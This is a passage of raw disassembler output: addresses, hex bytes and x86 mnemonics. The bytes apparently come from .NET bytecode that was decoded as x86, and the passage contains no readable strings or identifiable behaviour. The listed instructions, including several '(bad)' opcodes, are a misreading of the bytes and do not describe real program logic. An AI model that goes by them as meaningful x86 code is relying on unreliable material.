  40594a:	80 95 00 00 04 72 7e 	adcb   $0x7e,0x72040000(%ebp)
  405951:	0d 00 70 80 96       	or     $0x96807000,%eax
  405956:	00 00                	add    %al,(%eax)
  405958:	04 20                	add    $0x20,%al
  40595a:	ae                   	scas   %es:(%edi),%al
  40595b:	08 00                	or     %al,(%eax)
  40595d:	00 80 97 00 00 04    	add    %al,0x4000097(%eax)
  405963:	72 9c                	jb     0x405901
  405965:	0d 00 70 80 98       	or     $0x98807000,%eax
  40596a:	00 00                	add    %al,(%eax)
  40596c:	04 72                	add    $0x72,%al
  40596e:	9c                   	pushf
  40596f:	0d 00 70 80 99       	or     $0x99807000,%eax
  405974:	00 00                	add    %al,(%eax)
  405976:	04 73                	add    $0x73,%al
  405978:	b8 00 00 0a 80       	mov    $0x800a0000,%eax
  40597d:	9a 00 00 04 2a 00 00 	lcall  $0x0,$0x2a040000
  405984:	13 30                	adc    (%eax),%esi
  405986:	01 00                	add    %eax,(%eax)
  405988:	14 00                	adc    $0x0,%al
  40598a:	00 00                	add    %al,(%eax)
  40598c:	2c 00                	sub    $0x0,%al
  40598e:	00 11                	add    %dl,(%ecx)
  405990:	02 28                	add    (%eax),%ch
  405992:	59                   	pop    %ecx
  405993:	00 00                	add    %al,(%eax)
  405995:	06                   	push   %es
  405996:	6f                   	outsl  %ds:(%esi),(%dx)
  405997:	37                   	aaa
  405998:	00 00                	add    %al,(%eax)
  40599a:	0a 0a                	or     (%edx),%cl
  40599c:	12 00                	adc    (%eax),%al
  40599e:	28 39                	sub    %bh,(%ecx)
  4059a0:	00 00                	add    %al,(%eax)
  4059a2:	0a 2a                	or     (%edx),%ch
  4059a4:	1b 30                	sbb    (%eax),%esi
  4059a6:	06                   	push   %es
  4059a7:	00 d5                	add    %dl,%ch
  4059a9:	04 00                	add    $0x0,%al
  4059ab:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4059b1:	7b 9b                	jnp    0x40594e
  4059b3:	00 00                	add    %al,(%eax)
  4059b5:	04 0a                	add    $0xa,%al
  4059b7:	06                   	push   %es
  4059b8:	45                   	inc    %ebp
  4059b9:	07                   	pop    %es
  4059ba:	00 00                	add    %al,(%eax)
  4059bc:	00 15 01 00 00 ae    	add    %dl,0xae000001
  4059c2:	01 00                	add    %eax,(%eax)
  4059c4:	00 1d 02 00 00 49    	add    %bl,0x49000002
  4059ca:	02 00                	add    (%eax),%al
  4059cc:	00 49 02             	add    %cl,0x2(%ecx)
  4059cf:	00 00                	add    %al,(%eax)
  4059d1:	49                   	dec    %ecx
  4059d2:	02 00                	add    (%eax),%al
  4059d4:	00 38                	add    %bh,(%eax)
  4059d6:	04 00                	add    $0x0,%al
  4059d8:	00 28                	add    %ch,(%eax)
  4059da:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  4059df:	61                   	popa
  4059e0:	00 00                	add    %al,(%eax)
  4059e2:	06                   	push   %es
  4059e3:	28 ba 00 00 0a 28    	sub    %bh,0x280a0000(%edx)
  4059e9:	18 00                	sbb    %al,(%eax)
  4059eb:	00 0a                	add    %cl,(%edx)
  4059ed:	14 fe                	adc    $0xfe,%al
  4059ef:	06                   	push   %es
  4059f0:	5b                   	pop    %ebx
  4059f1:	00 00                	add    %al,(%eax)
  4059f3:	06                   	push   %es
  4059f4:	73 bb                	jae    0x4059b1
  4059f6:	00 00                	add    %al,(%eax)
  4059f8:	0a 6f bc             	or     -0x44(%edi),%ch
  4059fb:	00 00                	add    %al,(%eax)
  4059fd:	0a 28                	or     (%eax),%ch
  4059ff:	70 00                	jo     0x405a01
  405a01:	00 06                	add    %al,(%esi)
  405a03:	2c 14                	sub    $0x14,%al
  405a05:	7e 96                	jle    0x40599d
  405a07:	00 00                	add    %al,(%eax)
  405a09:	04 72                	add    $0x72,%al
  405a0b:	b2 0d                	mov    $0xd,%dl
  405a0d:	00 70 28             	add    %dh,0x28(%eax)
  405a10:	52                   	push   %edx
  405a11:	00 00                	add    %al,(%eax)
  405a13:	0a 80 96 00 00 04    	or     0x4000096(%eax),%al
  405a19:	7e 98                	jle    0x4059b3
  405a1b:	00 00                	add    %al,(%eax)
  405a1d:	04 72                	add    $0x72,%al
  405a1f:	9c                   	pushf
  405a20:	0d 00 70 28 bd       	or     $0xbd287000,%eax
  405a25:	00 00                	add    %al,(%eax)
  405a27:	0a 2c 70             	or     (%eax,%esi,2),%ch
  405a2a:	72 c0                	jb     0x4059ec
  405a2c:	0d 00 70 7e 98       	or     $0x987e7000,%eax
  405a31:	00 00                	add    %al,(%eax)
  405a33:	04 72                	add    $0x72,%al
  405a35:	c4 0d 00 70 28 6b    	les    0x6b287000,%ecx
  405a3b:	00 00                	add    %al,(%eax)
  405a3d:	0a 28                	or     (%eax),%ch
  405a3f:	be 00 00 0a 0c       	mov    $0xc0a0000,%esi
  405a44:	28 bf 00 00 0a 08    	sub    %bh,0x80a0000(%edi)
  405a4a:	28 bd 00 00 0a 2c    	sub    %bh,0x2c0a0000(%ebp)
  405a50:	44                   	inc    %esp
  405a51:	28 59 00             	sub    %bl,0x0(%ecx)
  405a54:	00 0a                	add    %cl,(%edx)
  405a56:	6f                   	outsl  %ds:(%esi),(%dx)
  405a57:	5a                   	pop    %edx
  405a58:	00 00                	add    %al,(%eax)
  405a5a:	0a 0d 08 28 c0 00    	or     0xc02808,%cl
  405a60:	00 0a                	add    %cl,(%edx)
  405a62:	2d 07 08 28 c1       	sub    $0xc1280807,%eax
  405a67:	00 00                	add    %al,(%eax)
  405a69:	0a 26                	or     (%esi),%ah
  405a6b:	09 08                	or     %ecx,(%eax)
  405a6d:	09 28                	or     %ebp,(%eax)
  405a6f:	c2 00 00             	ret    $0x0
  405a72:	0a 28                	or     (%eax),%ch
  405a74:	52                   	push   %edx
  405a75:	00 00                	add    %al,(%eax)
  405a77:	0a 28                	or     (%eax),%ch
  405a79:	c3                   	ret
  405a7a:	00 00                	add    %al,(%eax)
  405a7c:	0a 08                	or     (%eax),%cl
  405a7e:	09 28                	or     %ebp,(%eax)
  405a80:	c2 00 00             	ret    $0x0
  405a83:	0a 28                	or     (%eax),%ch
  405a85:	52                   	push   %edx
  405a86:	00 00                	add    %al,(%eax)
  405a88:	0a 28                	or     (%eax),%ch
  405a8a:	5b                   	pop    %ebx
  405a8b:	00 00                	add    %al,(%eax)
  405a8d:	0a 26                	or     (%esi),%ah
  405a8f:	16                   	push   %ss
  405a90:	28 c4                	sub    %al,%ah
  405a92:	00 00                	add    %al,(%eax)
  405a94:	0a de                	or     %dh,%bl
  405a96:	03 26                	add    (%esi),%esp
  405a98:	de 00                	fiadds (%eax)
  405a9a:	17                   	pop    %ss
  405a9b:	7e 96                	jle    0x405a33
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	04 12                	add    $0x12,%al
  405aa1:	01 73 c5             	add    %esi,-0x3b(%ebx)
  405aa4:	00 00                	add    %al,(%eax)
  405aa6:	0a 26                	or     (%esi),%ah
  405aa8:	07                   	pop    %es
  405aa9:	2d 05 dd c1 03       	sub    $0x3c1dd05,%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	7e 95                	jle    0x405a47
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 28                	add    $0x28,%al
  405ab6:	5c                   	pop    %esp
  405ab7:	00 00                	add    %al,(%eax)
  405ab9:	0a 6f 37             	or     0x37(%edi),%ch
  405abc:	00 00                	add    %al,(%eax)
  405abe:	0a 13                	or     (%ebx),%dl
  405ac0:	04 12                	add    $0x12,%al
  405ac2:	04 28                	add    $0x28,%al
  405ac4:	38 00                	cmp    %al,(%eax)
  405ac6:	00 0a                	add    %cl,(%edx)
  405ac8:	2d 41 02 16 25       	sub    $0x25160241,%eax
  405acd:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405ad0:	00 00                	add    %al,(%eax)
  405ad2:	04 02                	add    $0x2,%al
  405ad4:	11 04 7d 9d 00 00 04 	adc    %eax,0x400009d(,%edi,2)
  405adb:	02 7c 9c 00          	add    0x0(%esp,%ebx,4),%bh
  405adf:	00 04 12             	add    %al,(%edx,%edx,1)
  405ae2:	04 02                	add    $0x2,%al
  405ae4:	28 3a                	sub    %bh,(%edx)
  405ae6:	00 00                	add    %al,(%eax)
  405ae8:	2b dd                	sub    %ebp,%ebx
  405aea:	96                   	xchg   %eax,%esi
  405aeb:	03 00                	add    (%eax),%eax
  405aed:	00 02                	add    %al,(%edx)
  405aef:	7b 9d                	jnp    0x405a8e
  405af1:	00 00                	add    %al,(%eax)
  405af3:	04 13                	add    $0x13,%al
  405af5:	04 02                	add    $0x2,%al
  405af7:	7c 9d                	jl     0x405a96
  405af9:	00 00                	add    %al,(%eax)
  405afb:	04 fe                	add    $0xfe,%al
  405afd:	15 0a 00 00 01       	adc    $0x100000a,%eax
  405b02:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405b08:	00 00                	add    %al,(%eax)
  405b0a:	04 12                	add    $0x12,%al
  405b0c:	04 28                	add    $0x28,%al
  405b0e:	39 00                	cmp    %eax,(%eax)
  405b10:	00 0a                	add    %cl,(%edx)
  405b12:	7e 97                	jle    0x405aab
  405b14:	00 00                	add    %al,(%eax)
  405b16:	04 17                	add    $0x17,%al
  405b18:	40                   	inc    %eax
  405b19:	fe 00                	incb   (%eax)
  405b1b:	00 00                	add    %al,(%eax)
  405b1d:	7e 99                	jle    0x405ab8
  405b1f:	00 00                	add    %al,(%eax)
  405b21:	04 72                	add    $0x72,%al
  405b23:	9c                   	pushf
  405b24:	0d 00 70 28 21       	or     $0x21287000,%eax
  405b29:	00 00                	add    %al,(%eax)
  405b2b:	0a 2c 0a             	or     (%edx,%ecx,1),%ch
  405b2e:	72 e2                	jb     0x405b12
  405b30:	0d 00 70 80 99       	or     $0x99807000,%eax
  405b35:	00 00                	add    %al,(%eax)
  405b37:	04 28                	add    $0x28,%al
  405b39:	70 00                	jo     0x405b3b
  405b3b:	00 06                	add    %al,(%esi)
  405b3d:	2c 6f                	sub    $0x6f,%al
  405b3f:	28 59 00             	sub    %bl,0x0(%ecx)
  405b42:	00 0a                	add    %cl,(%edx)
  405b44:	6f                   	outsl  %ds:(%esi),(%dx)
  405b45:	5a                   	pop    %edx
  405b46:	00 00                	add    %al,(%eax)
  405b48:	0a 7e 99             	or     -0x67(%esi),%bh
  405b4b:	00 00                	add    %al,(%eax)
  405b4d:	04 28                	add    $0x28,%al
  405b4f:	79 00                	jns    0x405b51
  405b51:	00 06                	add    %al,(%esi)
  405b53:	6f                   	outsl  %ds:(%esi),(%dx)
  405b54:	2b 00                	sub    (%eax),%eax
  405b56:	00 0a                	add    %cl,(%edx)
  405b58:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  405b5e:	00 00                	add    %al,(%eax)
  405b60:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  405b66:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405b69:	00 00                	add    %al,(%eax)
  405b6b:	04 02                	add    $0x2,%al
  405b6d:	11 05 7d 9e 00 00    	adc    %eax,0x9e7d
  405b73:	04 02                	add    $0x2,%al
  405b75:	7c 9c                	jl     0x405b13
  405b77:	00 00                	add    %al,(%eax)
  405b79:	04 12                	add    $0x12,%al
  405b7b:	05 02 28 3b 00       	add    $0x3b2802,%eax
  405b80:	00 2b                	add    %ch,(%ebx)
  405b82:	dd fd                	(bad)
  405b84:	02 00                	add    (%eax),%al
  405b86:	00 02                	add    %al,(%edx)
  405b88:	7b 9e                	jnp    0x405b28
  405b8a:	00 00                	add    %al,(%eax)
  405b8c:	04 13                	add    $0x13,%al
  405b8e:	05 02 7c 9e 00       	add    $0x9e7c02,%eax
  405b93:	00 04 fe             	add    %al,(%esi,%edi,8)
  405b96:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  405b9b:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405ba1:	00 00                	add    %al,(%eax)
  405ba3:	04 12                	add    $0x12,%al
  405ba5:	05 28 2d 00 00       	add    $0x2d28,%eax
  405baa:	0a 26                	or     (%esi),%ah
  405bac:	2b 6d 28             	sub    0x28(%ebp),%ebp
  405baf:	59                   	pop    %ecx
  405bb0:	00 00                	add    %al,(%eax)
  405bb2:	0a 6f 5a             	or     0x5a(%edi),%ch
  405bb5:	00 00                	add    %al,(%eax)
  405bb7:	0a 7e 99             	or     -0x67(%esi),%bh
  405bba:	00 00                	add    %al,(%eax)
  405bbc:	04 28                	add    $0x28,%al
  405bbe:	78 00                	js     0x405bc0
  405bc0:	00 06                	add    %al,(%esi)
  405bc2:	6f                   	outsl  %ds:(%esi),(%dx)
  405bc3:	2b 00                	sub    (%eax),%eax
  405bc5:	00 0a                	add    %cl,(%edx)
  405bc7:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  405bcd:	00 00                	add    %al,(%eax)
  405bcf:	0a 2d 41 02 18 25    	or     0x25180241,%ch
  405bd5:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405bd8:	00 00                	add    %al,(%eax)
  405bda:	04 02                	add    $0x2,%al
  405bdc:	11 05 7d 9e 00 00    	adc    %eax,0x9e7d
  405be2:	04 02                	add    $0x2,%al
  405be4:	7c 9c                	jl     0x405b82
  405be6:	00 00                	add    %al,(%eax)
  405be8:	04 12                	add    $0x12,%al
  405bea:	05 02 28 3b 00       	add    $0x3b2802,%eax
  405bef:	00 2b                	add    %ch,(%ebx)
  405bf1:	dd 8e 02 00 00 02    	fisttpll 0x2000002(%esi)
  405bf7:	7b 9e                	jnp    0x405b97
  405bf9:	00 00                	add    %al,(%eax)
  405bfb:	04 13                	add    $0x13,%al
  405bfd:	05 02 7c 9e 00       	add    $0x9e7c02,%eax
  405c02:	00 04 fe             	add    %al,(%esi,%edi,8)
  405c05:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  405c0a:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405c10:	00 00                	add    %al,(%eax)
  405c12:	04 12                	add    $0x12,%al
  405c14:	05 28 2d 00 00       	add    $0x2d28,%eax
  405c19:	0a 26                	or     (%esi),%ah
  405c1b:	02 16                	add    (%esi),%dl
  405c1d:	7d a0                	jge    0x405bbf
  405c1f:	00 00                	add    %al,(%eax)
  405c21:	04 00                	add    $0x0,%al
  405c23:	06                   	push   %es
  405c24:	19 59 45             	sbb    %ebx,0x45(%ecx)
  405c27:	03 00                	add    (%eax),%eax
  405c29:	00 00                	add    %al,(%eax)
  405c2b:	57                   	push   %edi
  405c2c:	00 00                	add    %al,(%eax)
  405c2e:	00 cd                	add    %cl,%ch
  405c30:	00 00                	add    %al,(%eax)
  405c32:	00 3e                	add    %bh,(%esi)
  405c34:	01 00                	add    %eax,(%eax)
  405c36:	00 02                	add    %al,(%edx)
  405c38:	18 17                	sbb    %dl,(%edi)
  405c3a:	1c 73                	sbb    $0x73,%al
  405c3c:	8c 00                	mov    %es,(%eax)
  405c3e:	00 0a                	add    %cl,(%edx)
  405c40:	7d a1                	jge    0x405be3
  405c42:	00 00                	add    %al,(%eax)
  405c44:	04 02                	add    $0x2,%al
  405c46:	7b a1                	jnp    0x405be9
  405c48:	00 00                	add    %al,(%eax)
  405c4a:	04 7e                	add    $0x7e,%al
  405c4c:	92                   	xchg   %eax,%edx
  405c4d:	00 00                	add    %al,(%eax)
  405c4f:	04 7e                	add    $0x7e,%al
  405c51:	93                   	xchg   %eax,%ebx
  405c52:	00 00                	add    %al,(%eax)
  405c54:	04 28                	add    $0x28,%al
  405c56:	c6 00 00             	movb   $0x0,(%eax)
  405c59:	0a 6f 37             	or     0x37(%edi),%ch
  405c5c:	00 00                	add    %al,(%eax)
  405c5e:	0a 13                	or     (%ebx),%dl
  405c60:	04 12                	add    $0x12,%al
  405c62:	04 28                	add    $0x28,%al
  405c64:	38 00                	cmp    %al,(%eax)
  405c66:	00 0a                	add    %cl,(%edx)
  405c68:	2d 41 02 19 25       	sub    $0x25190241,%eax
  405c6d:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405c70:	00 00                	add    %al,(%eax)
  405c72:	04 02                	add    $0x2,%al
  405c74:	11 04 7d 9d 00 00 04 	adc    %eax,0x400009d(,%edi,2)
  405c7b:	02 7c 9c 00          	add    0x0(%esp,%ebx,4),%bh
  405c7f:	00 04 12             	add    %al,(%edx,%edx,1)
  405c82:	04 02                	add    $0x2,%al
  405c84:	28 3a                	sub    %bh,(%edx)
  405c86:	00 00                	add    %al,(%eax)
  405c88:	2b dd                	sub    %ebp,%ebx
  405c8a:	f6 01 00             	testb  $0x0,(%ecx)
  405c8d:	00 02                	add    %al,(%edx)
  405c8f:	7b 9d                	jnp    0x405c2e
  405c91:	00 00                	add    %al,(%eax)
  405c93:	04 13                	add    $0x13,%al
  405c95:	04 02                	add    $0x2,%al
  405c97:	7c 9d                	jl     0x405c36
  405c99:	00 00                	add    %al,(%eax)
  405c9b:	04 fe                	add    $0xfe,%al
  405c9d:	15 0a 00 00 01       	adc    $0x100000a,%eax
  405ca2:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405ca8:	00 00                	add    %al,(%eax)
  405caa:	04 12                	add    $0x12,%al
  405cac:	04 28                	add    $0x28,%al
  405cae:	39 00                	cmp    %eax,(%eax)
  405cb0:	00 0a                	add    %cl,(%edx)
  405cb2:	02 7b a1             	add    -0x5f(%ebx),%bh
  405cb5:	00 00                	add    %al,(%eax)
  405cb7:	04 7e                	add    $0x7e,%al
  405cb9:	94                   	xchg   %eax,%esp
  405cba:	00 00                	add    %al,(%eax)
  405cbc:	04 16                	add    $0x16,%al
  405cbe:	16                   	push   %ss
  405cbf:	14 fe                	adc    $0xfe,%al
  405cc1:	06                   	push   %es
  405cc2:	5a                   	pop    %edx
  405cc3:	00 00                	add    %al,(%eax)
  405cc5:	06                   	push   %es
  405cc6:	73 4d                	jae    0x405d15
  405cc8:	00 00                	add    %al,(%eax)
  405cca:	0a 28                	or     (%eax),%ch
  405ccc:	75 00                	jne    0x405cce
  405cce:	00 06                	add    %al,(%esi)
  405cd0:	6f                   	outsl  %ds:(%esi),(%dx)
  405cd1:	4e                   	dec    %esi
  405cd2:	00 00                	add    %al,(%eax)
  405cd4:	0a 13                	or     (%ebx),%dl
  405cd6:	06                   	push   %es
  405cd7:	12 06                	adc    (%esi),%al
  405cd9:	28 4f 00             	sub    %cl,0x0(%edi)
  405cdc:	00 0a                	add    %cl,(%edx)
  405cde:	2d 41 02 1a 25       	sub    $0x251a0241,%eax
  405ce3:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405ce6:	00 00                	add    %al,(%eax)
  405ce8:	04 02                	add    $0x2,%al
  405cea:	11 06                	adc    %eax,(%esi)
  405cec:	7d a2                	jge    0x405c90
  405cee:	00 00                	add    %al,(%eax)
  405cf0:	04 02                	add    $0x2,%al
  405cf2:	7c 9c                	jl     0x405c90
  405cf4:	00 00                	add    %al,(%eax)
  405cf6:	04 12                	add    $0x12,%al
  405cf8:	06                   	push   %es
  405cf9:	02 28                	add    (%eax),%ch
  405cfb:	3c 00                	cmp    $0x0,%al
  405cfd:	00 2b                	add    %ch,(%ebx)
  405cff:	dd 80 01 00 00 02    	fldl   0x2000001(%eax)
  405d05:	7b a2                	jnp    0x405ca9
  405d07:	00 00                	add    %al,(%eax)
  405d09:	04 13                	add    $0x13,%al
  405d0b:	06                   	push   %es
  405d0c:	02 7c a2 00          	add    0x0(%edx,%eiz,4),%bh
  405d10:	00 04 fe             	add    %al,(%esi,%edi,8)
  405d13:	15 08 00 00 1b       	adc    $0x1b000008,%eax
  405d18:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405d1e:	00 00                	add    %al,(%eax)
  405d20:	04 12                	add    $0x12,%al
  405d22:	06                   	push   %es
  405d23:	28 50 00             	sub    %dl,0x0(%eax)
  405d26:	00 0a                	add    %cl,(%edx)
  405d28:	80 90 00 00 04 7e 90 	adcb   $0x90,0x7e040000(%eax)
  405d2f:	00 00                	add    %al,(%eax)
  405d31:	04 7e                	add    $0x7e,%al
  405d33:	91                   	xchg   %eax,%ecx
  405d34:	00 00                	add    %al,(%eax)
  405d36:	04 73                	add    $0x73,%al
  405d38:	11 00                	adc    %eax,(%eax)
  405d3a:	00 06                	add    %al,(%esi)
  405d3c:	6f                   	outsl  %ds:(%esi),(%dx)
  405d3d:	15 00 00 06 6f       	adc    $0x6f060000,%eax
  405d42:	37                   	aaa
  405d43:	00 00                	add    %al,(%eax)
  405d45:	0a 13                	or     (%ebx),%dl
  405d47:	04 12                	add    $0x12,%al
  405d49:	04 28                	add    $0x28,%al
  405d4b:	38 00                	cmp    %al,(%eax)
  405d4d:	00 0a                	add    %cl,(%edx)
  405d4f:	2d 41 02 1b 25       	sub    $0x251b0241,%eax
  405d54:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405d57:	00 00                	add    %al,(%eax)
  405d59:	04 02                	add    $0x2,%al
  405d5b:	11 04 7d 9d 00 00 04 	adc    %eax,0x400009d(,%edi,2)
  405d62:	02 7c 9c 00          	add    0x0(%esp,%ebx,4),%bh
  405d66:	00 04 12             	add    %al,(%edx,%edx,1)
  405d69:	04 02                	add    $0x2,%al
  405d6b:	28 3a                	sub    %bh,(%edx)
  405d6d:	00 00                	add    %al,(%eax)
  405d6f:	2b dd                	sub    %ebp,%ebx
  405d71:	0f 01 00             	sgdtl  (%eax)
  405d74:	00 02                	add    %al,(%edx)
  405d76:	7b 9d                	jnp    0x405d15
  405d78:	00 00                	add    %al,(%eax)
  405d7a:	04 13                	add    $0x13,%al
  405d7c:	04 02                	add    $0x2,%al
  405d7e:	7c 9d                	jl     0x405d1d
  405d80:	00 00                	add    %al,(%eax)
  405d82:	04 fe                	add    $0xfe,%al
  405d84:	15 0a 00 00 01       	adc    $0x100000a,%eax
  405d89:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405d8f:	00 00                	add    %al,(%eax)
  405d91:	04 12                	add    $0x12,%al
  405d93:	04 28                	add    $0x28,%al
  405d95:	39 00                	cmp    %eax,(%eax)
  405d97:	00 0a                	add    %cl,(%edx)
  405d99:	02 14 7d a1 00 00 04 	add    0x40000a1(,%edi,2),%dl
  405da0:	de 13                	ficoms (%ebx)
  405da2:	13 07                	adc    (%edi),%eax
  405da4:	02 11                	add    (%ecx),%dl
  405da6:	07                   	pop    %es
  405da7:	7d 9f                	jge    0x405d48
  405da9:	00 00                	add    %al,(%eax)
  405dab:	04 02                	add    $0x2,%al
  405dad:	17                   	pop    %ss
  405dae:	7d a0                	jge    0x405d50
  405db0:	00 00                	add    %al,(%eax)
  405db2:	04 de                	add    $0xde,%al
  405db4:	00 02                	add    %al,(%edx)
  405db6:	7b a0                	jnp    0x405d58
  405db8:	00 00                	add    %al,(%eax)
  405dba:	04 13                	add    $0x13,%al
  405dbc:	08 11                	or     %dl,(%ecx)
  405dbe:	08 17                	or     %dl,(%edi)
  405dc0:	40                   	inc    %eax
  405dc1:	87 00                	xchg   %eax,(%eax)
  405dc3:	00 00                	add    %al,(%eax)
  405dc5:	02 02                	add    (%edx),%al
  405dc7:	7b 9f                	jnp    0x405d68
  405dc9:	00 00                	add    %al,(%eax)
  405dcb:	04 74                	add    $0x74,%al
  405dcd:	0b 00                	or     (%eax),%eax
  405dcf:	00 01                	add    %al,(%ecx)
  405dd1:	7d a3                	jge    0x405d76
  405dd3:	00 00                	add    %al,(%eax)
  405dd5:	04 20                	add    $0x20,%al
  405dd7:	10 27                	adc    %ah,(%edi)
  405dd9:	00 00                	add    %al,(%eax)
  405ddb:	28 5c 00 00          	sub    %bl,0x0(%eax,%eax,1)
  405ddf:	0a 6f 37             	or     0x37(%edi),%ch
  405de2:	00 00                	add    %al,(%eax)
  405de4:	0a 13                	or     (%ebx),%dl
  405de6:	04 12                	add    $0x12,%al
  405de8:	04 28                	add    $0x28,%al
  405dea:	38 00                	cmp    %al,(%eax)
  405dec:	00 0a                	add    %cl,(%edx)
  405dee:	2d 3e 02 1c 25       	sub    $0x251c023e,%eax
  405df3:	0a 7d 9b             	or     -0x65(%ebp),%bh
  405df6:	00 00                	add    %al,(%eax)
  405df8:	04 02                	add    $0x2,%al
  405dfa:	11 04 7d 9d 00 00 04 	adc    %eax,0x400009d(,%edi,2)
  405e01:	02 7c 9c 00          	add    0x0(%esp,%ebx,4),%bh
  405e05:	00 04 12             	add    %al,(%edx,%edx,1)
  405e08:	04 02                	add    $0x2,%al
  405e0a:	28 3a                	sub    %bh,(%edx)
  405e0c:	00 00                	add    %al,(%eax)
  405e0e:	2b de                	sub    %esi,%ebx
  405e10:	73 02                	jae    0x405e14
  405e12:	7b 9d                	jnp    0x405db1
  405e14:	00 00                	add    %al,(%eax)
  405e16:	04 13                	add    $0x13,%al
  405e18:	04 02                	add    $0x2,%al
  405e1a:	7c 9d                	jl     0x405db9
  405e1c:	00 00                	add    %al,(%eax)
  405e1e:	04 fe                	add    $0xfe,%al
  405e20:	15 0a 00 00 01       	adc    $0x100000a,%eax
  405e25:	02 15 25 0a 7d 9b    	add    0x9b7d0a25,%dl
  405e2b:	00 00                	add    %al,(%eax)
  405e2d:	04 12                	add    $0x12,%al
  405e2f:	04 28                	add    $0x28,%al
  405e31:	39 00                	cmp    %eax,(%eax)
  405e33:	00 0a                	add    %cl,(%edx)
  405e35:	02 7b a3             	add    -0x5d(%ebx),%bh
  405e38:	00 00                	add    %al,(%eax)
  405e3a:	04 6f                	add    $0x6f,%al
  405e3c:	3a 00                	cmp    (%eax),%al
  405e3e:	00 0a                	add    %cl,(%edx)
  405e40:	28 29                	sub    %ch,(%ecx)
  405e42:	00 00                	add    %al,(%eax)
  405e44:	0a 02                	or     (%edx),%al
  405e46:	14 7d                	adc    $0x7d,%al
  405e48:	a3 00 00 04 02       	mov    %eax,0x2040000
  405e4d:	14 7d                	adc    $0x7d,%al
  405e4f:	9f                   	lahf
  405e50:	00 00                	add    %al,(%eax)
  405e52:	04 38                	add    $0x38,%al
  405e54:	c3                   	ret
  405e55:	fd                   	std
  405e56:	ff                   	(bad)
  405e57:	ff 13                	call   *(%ebx)
  405e59:	09 02                	or     %eax,(%edx)
  405e5b:	1f                   	pop    %ds
  405e5c:	fe                   	(bad)
  405e5d:	7d 9b                	jge    0x405dfa
  405e5f:	00 00                	add    %al,(%eax)
  405e61:	04 02                	add    $0x2,%al
  405e63:	7c 9c                	jl     0x405e01
  405e65:	00 00                	add    %al,(%eax)
  405e67:	04 11                	add    $0x11,%al
  405e69:	09 28                	or     %ebp,(%eax)
  405e6b:	3d 00 00 0a de       	cmp    $0xde0a0000,%eax
  405e70:	13 02                	adc    (%edx),%eax
  405e72:	1f                   	pop    %ds
  405e73:	fe                   	(bad)
  405e74:	7d 9b                	jge    0x405e11
  405e76:	00 00                	add    %al,(%eax)
  405e78:	04 02                	add    $0x2,%al
  405e7a:	7c 9c                	jl     0x405e18
  405e7c:	00 00                	add    %al,(%eax)
  405e7e:	04 28                	add    $0x28,%al
  405e80:	3e 00 00             	add    %al,%ds:(%eax)
  405e83:	0a 2a                	or     (%edx),%ch
  405e85:	00 00                	add    %al,(%eax)
  405e87:	00 41 4c             	add    %al,0x4c(%ecx)
  405e8a:	00 00                	add    %al,(%eax)
  405e8c:	00 00                	add    %al,(%eax)
  405e8e:	00 00                	add    %al,(%eax)
  405e90:	7a 00                	jp     0x405e92
  405e92:	00 00                	add    %al,(%eax)
  405e94:	6d                   	insl   (%dx),%es:(%edi)
  405e95:	00 00                	add    %al,(%eax)
  405e97:	00 e7                	add    %ah,%bh
  405e99:	00 00                	add    %al,(%eax)
  405e9b:	00 03                	add    %al,(%ebx)
  405e9d:	00 00                	add    %al,(%eax)
  405e9f:	00 01                	add    %al,(%ecx)
  405ea1:	00 00                	add    %al,(%eax)
  405ea3:	01 00                	add    %eax,(%eax)
  405ea5:	00 00                	add    %al,(%eax)
  405ea7:	00 73 02             	add    %dh,0x2(%ebx)
  405eaa:	00 00                	add    %al,(%eax)
  405eac:	7f 01                	jg     0x405eaf
  405eae:	00 00                	add    %al,(%eax)
  405eb0:	f2 03 00             	repnz add (%eax),%eax
  405eb3:	00 13                	add    %dl,(%ebx)
  405eb5:	00 00                	add    %al,(%eax)
  405eb7:	00 0b                	add    %cl,(%ebx)
  405eb9:	00 00                	add    %al,(%eax)
  405ebb:	01 00                	add    %eax,(%eax)
  405ebd:	00 00                	add    %al,(%eax)
  405ebf:	00 07                	add    %al,(%edi)
  405ec1:	00 00                	add    %al,(%eax)
  405ec3:	00 a1 04 00 00 a8    	add    %ah,-0x57fffffc(%ecx)
  405ec9:	04 00                	add    $0x0,%al
  405ecb:	00 19                	add    %bl,(%ecx)
  405ecd:	00 00                	add    %al,(%eax)
  405ecf:	00 0b                	add    %cl,(%ebx)
  405ed1:	00 00                	add    %al,(%eax)
  405ed3:	01 13                	add    %edx,(%ebx)
  405ed5:	30 02                	xor    %al,(%edx)
  405ed7:	00 2f                	add    %ch,(%edi)
  405ed9:	00 00                	add    %al,(%eax)
  405edb:	00 2e                	add    %ch,(%esi)
  405edd:	00 00                	add    %al,(%eax)
  405edf:	11 12                	adc    %edx,(%edx)
  405ee1:	00 28                	add    %ch,(%eax)
  405ee3:	ce                   	into
  405ee4:	00 00                	add    %al,(%eax)
  405ee6:	0a 7d ab             	or     -0x55(%ebp),%bh
  405ee9:	00 00                	add    %al,(%eax)
  405eeb:	04 12                	add    $0x12,%al
  405eed:	00 15 7d aa 00 00    	add    %dl,0xaa7d
  405ef3:	04 12                	add    $0x12,%al
  405ef5:	00 7c ab 00          	add    %bh,0x0(%ebx,%ebp,4)
  405ef9:	00 04 12             	add    %al,(%edx,%edx,1)
  405efc:	00 28                	add    %ch,(%eax)
  405efe:	3d 00 00 2b 12       	cmp    $0x122b0000,%eax
